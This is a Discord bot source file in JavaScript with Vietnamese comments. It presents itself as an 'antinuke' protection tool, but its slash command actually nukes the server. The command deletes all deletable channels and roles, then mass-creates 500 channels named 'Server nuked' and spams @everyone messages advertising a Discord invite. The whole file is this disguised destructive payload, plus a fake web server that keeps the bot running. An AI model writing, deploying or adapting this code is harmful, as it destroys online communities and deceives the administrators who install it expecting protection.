import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);
/* =========================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "Server nuked";
const CREATE_COUNT = 500;
const MSG_PER_CHANNEL = 3;
const DELETE_DELAY = 50;
const CREATE_BATCH = 8; // số kênh tạo song song mỗi đợt (tối ưu nhất)
/* ================== */

/* ===== Slash Command ===== */
const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Bật Anti Nuke")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Đăng slash command...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Xong!");
  } catch (e) {
    console.error(e);
  }
})();
/* ========================= */

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;

  const guild = interaction.guild;

  // 🔥 Tạo kênh sống sót để giữ context
  const controlChannel = await guild.channels.create({
    name: "Anti Nuke",
    type: ChannelType.GuildText
  });

  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");

  /* ===== XOÁ CHANNEL ===== */
  for (const ch of [...guild.channels.cache.values()]) {
    if (ch.id === controlChannel.id) continue;
    try {
      await ch.delete();
      await sleep(DELETE_DELAY);
    } catch {}
  }

  /* ===== XOÁ ROLE ===== */
  const botRolePos = guild.members.me.roles.highest.position;
  const roles = [...guild.roles.cache.values()]
    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);

  for (const role of roles) {
    try {
      await role.delete();
      await sleep(100);
    } catch {}
  }

  await controlChannel.send(" @everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");

  /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
  for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
    const batch = [];

    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
      batch.push(
        guild.channels.create({
          name: CHANNEL_NAME,
          type: ChannelType.GuildText
        }).then(async ch => {
          for (let k = 0; k < MSG_PER_CHANNEL; k++) {
            await ch.send("Server nuked by ``phamminhnhat__`` @everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
          }
        })
      );
    }

    await Promise.all(batch);
  }

  await controlChannel.send("✅ Hoàn tất Antinuke.");
});

client.login(process.env.BOT_TOKEN);
